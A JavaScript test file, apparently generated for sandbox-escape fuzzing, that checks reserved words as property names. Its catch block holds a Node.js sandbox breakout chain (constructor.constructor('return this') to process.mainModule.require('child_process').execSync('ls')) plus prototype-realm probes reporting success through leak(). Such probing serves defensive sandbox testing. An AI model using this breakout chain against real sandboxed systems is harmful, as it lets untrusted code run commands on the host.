try {
    var tokenCodes = {};
    tokenCodes.await = 'await';
    tokenCodes.break = 'break';
    tokenCodes.case = 'case';
    tokenCodes.catch = 'catch';
    tokenCodes.class = 'class';
    tokenCodes.const = 'const';
    tokenCodes.continue = 'continue';
    tokenCodes.debugger = 'debugger';
    tokenCodes.default = 'default';
    tokenCodes.delete = 'delete';
    tokenCodes.do = 'do';
    tokenCodes.else = 'else';
    tokenCodes.export = 'export';
    tokenCodes.extends = 'extends';
    tokenCodes.finally = 'finally';
    tokenCodes.for = 'for';
    tokenCodes.function = 'function';
    tokenCodes.if = 'if';
    tokenCodes.import = 'import';
    tokenCodes.in = 'in';
    tokenCodes.instanceof = 'instanceof';
    tokenCodes.new = 'new';
    tokenCodes.return = 'return';
    tokenCodes.super = 'super';
    tokenCodes.switch = 'switch';
    tokenCodes.this = 'this';
    tokenCodes.throw = 'throw';
    tokenCodes.try = 'try';
    tokenCodes.typeof = 'typeof';
    tokenCodes.var = 'var';
    tokenCodes.void = 'void';
    tokenCodes.while = 'while';
    tokenCodes.with = 'with';
    tokenCodes.yield = 'yield';
    tokenCodes.enum = 'enum';
    tokenCodes.implements = 'implements';
    tokenCodes.interface = 'interface';
    tokenCodes.package = 'package';
    tokenCodes.protected = 'protected';
    tokenCodes.private = 'private';
    tokenCodes.public = 'public';
    tokenCodes.let = 'let';
    tokenCodes.static = 'static';
    var arr = [
        'await',
        'break',
        'case',
        'catch',
        'class',
        'const',
        'continue',
        'debugger',
        'default',
        'delete',
        'do',
        'else',
        'export',
        'extends',
        'finally',
        'for',
        'function',
        'if',
        'import',
        'in',
        'instanceof',
        'new',
        'return',
        'super',
        'switch',
        'this',
        'throw',
        'try',
        'typeof',
        'var',
        'void',
        'while',
        'with',
        'yield',
        'enum',
        'implements',
        'interface',
        'package',
        'protected',
        'private',
        'public',
        'let',
        'static'
    ];
    for (var i = 0; i < arr.length; ++i) {
        var propertyName = arr[i];
        assert(tokenCodes.hasOwnProperty(propertyName), 'Property "' + propertyName + '" found');
        assert.sameValue(tokenCodes[propertyName], propertyName, 'Property "' + propertyName + '" has correct value');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}